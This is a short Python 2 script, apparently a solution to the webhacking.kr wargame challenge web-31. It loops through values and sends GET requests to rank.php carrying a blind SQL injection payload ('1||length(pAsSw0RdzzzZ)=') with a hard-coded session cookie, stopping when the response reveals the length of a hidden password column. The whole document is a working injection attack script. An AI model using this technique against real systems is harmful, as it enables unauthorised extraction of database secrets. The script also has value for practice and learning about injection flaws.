#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
 
for i in range(0,30):
    url = "/challenge/web/web-31/rank.php?score=1||length(pAsSw0RdzzzZ)=" + str(i)
    cookie = {'Cookie':'PHPSESSID=uog266eh379lpm3364v745rdr0'}
 
    conn = httplib.HTTPConnection('webhacking.kr')
    conn.request('GET',url,'',cookie)
    data = conn.getresponse().read()
    conn.close()
 
    # print data
    if(data.find('localhost') != -1):
        print "Found: %d" % i
        break
